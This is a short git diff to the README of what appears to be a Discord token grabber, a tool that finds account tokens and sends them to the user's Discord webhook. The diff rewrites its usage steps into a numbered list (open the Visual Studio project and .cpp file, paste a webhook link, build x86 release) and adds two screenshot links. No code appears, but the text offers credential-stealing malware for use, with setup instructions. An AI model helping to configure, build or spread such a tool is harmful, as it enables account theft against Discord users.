@@ -13,7 +13,10 @@ it finds a token, it sends it to your Discord webhook.
 - Smaller file size
 
 ## Usage
-- Make sure you have Visual Studio 2019 with C++ installed.
-- Open the .sln project and paste your webhook.
-- Build x86 release
+1. Make sure you have Visual Studio 2019 with C++ installed.
+2. Open the .sln project and then open the .cpp file.
+3. Paste your webhook link
+4. Build x86 release
 
+![Picture1](https://i.ibb.co/WkhMG27/Screenshot-259.png)
+![Picture2](https://i.ibb.co/vv0Khm4/Screenshot-258.png)
